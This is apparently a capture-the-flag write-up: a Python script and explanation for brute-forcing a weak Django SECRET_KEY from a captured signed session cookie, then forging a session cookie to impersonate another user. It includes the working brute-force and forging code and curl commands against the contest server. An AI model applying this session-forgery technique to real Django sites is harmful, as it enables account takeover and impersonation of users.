from django.conf import settings
from django.core import signing

signed = 'eyJ1c2VyIjoiNDMxNjEyIn0:1YlUhB:CrsJLAuRSbP1_ZmFR64EhVN1fd8'
with open("dictionary.txt", "r") as f:
    words = f.read().split("\n")
    for word in words:
        settings.SECRET_KEY = word
        try:
            print word, settings.SECRET_KEY
            print signing.loads(signed, key=word, salt='django.contrib.sessions.backends.signed_cookies') # You get this from the list of possible salts from `grep "salt=" * -R` in the django repository
            break
        except Exception, e:
            print e
            pass
print signing.dumps({"user": "M4gn4te Troll"}, key=settings.SECRET_KEY, salt='django.contrib.sessions.backends.signed_cookies')

'''
The problem is "Please, sign here." which means that we should have something to do with signing. Also, from the source file, we find a comment:
<!-- I heard that you could change the secret key to whatever you want. I changed it to some word I found in the dictionary. -->

Still, this does not give us what we want. What is this server?? What is this problem??

A hint came to use when we sent a POST request to the server: `curl -X POST web.camsctf.com/d/ -D -`
Out came a debug message telling us about csrf tokens in django. Bingo. We know that we have to find a way to exploit django's signing.

We can first retrieve our sessionid using `curl web.camsctf.com/d/ --cookie-jar -`
eyJ1c2VyIjoiNDMxNjEyIn0:1YlUhB:CrsJLAuRSbP1_ZmFR64EhVN1fd8

Then looking through pages upon pages of documentation, we came across the django.core.signing module that explained the use of dumps and loads. The output from the server sessionid cookie looks a lot like the output of a signing.dumps!

However, M4gn4te Troll has changed the settings.SECRET_KEY to a word in the dictionary, so let's brute force it. When that did not come up with anything, we determined that the salt may be different since the server is calling signing.dumps from another location. That means that it's not the default 'django.core.signing'!
Doing a simple `grep "salt=" * -R` in the django's source code, we come across the following:

contrib/auth/hashers.py:def make_password(password, salt=None, hasher='default'):
contrib/sessions/backends/signed_cookies.py:                salt='django.contrib.sessions.backends.signed_cookies')
contrib/sessions/backends/signed_cookies.py:            salt='django.contrib.sessions.backends.signed_cookies',
core/signing.py:def get_cookie_signer(salt='django.core.signing.get_cookie_signer'):
core/signing.py:    return Signer(b'django.http.cookies' + key, salt=salt)
core/signing.py:def dumps(obj, key=None, salt='django.core.signing', serializer=JSONSerializer, compress=False):
core/signing.py:    return TimestampSigner(key, salt=salt).sign(base64d)
core/signing.py:def loads(s, key=None, salt='django.core.signing', serializer=JSONSerializer, max_age=None):
core/signing.py:    base64d = force_bytes(TimestampSigner(key, salt=salt).unsign(s, max_age=max_age))
core/signing.py:    def __init__(self, key=None, sep=':', salt=None):
http/request.py:    def get_signed_cookie(self, key, default=RAISE_ERROR, salt='', max_age=None):
http/request.py:            value = signing.get_cookie_signer(salt=key + salt).unsign(
http/response.py:    def set_signed_cookie(self, key, value, salt='', **kwargs):
http/response.py:        value = signing.get_cookie_signer(salt=key + salt).sign(value)

Looking at the results of the search, the value for the salt can be either 'django.contrib.sessions.backends.signed_cookies' or 'django.core.signing.get_cookie_signer'. Trying both, 'django.contrib.sessions.backends.signed_cookies' was the correct salt.

Turns out that M4gn4te Troll used 'bugaboo' as the word from the dictionary as his SECRET_KEY. Now let's sign a json object where we pose as M4gn4te Troll and send that to the server. We're using the SECRET_KEY that we found and 'django.contrib.sessions.backends.signed_cookies' as the salt.

> curl -X GET web.camsctf.com/d/ -D - -b "sessionid=eyJ1c2VyIjoiTTRnbjR0ZSBUcm9sbCJ9:1YlV8s:Zj1vAUwbnvWO2ia75vFGcZdjoEM"

W00t! It works!

Flag: {k33p_secrets_secret}
'''
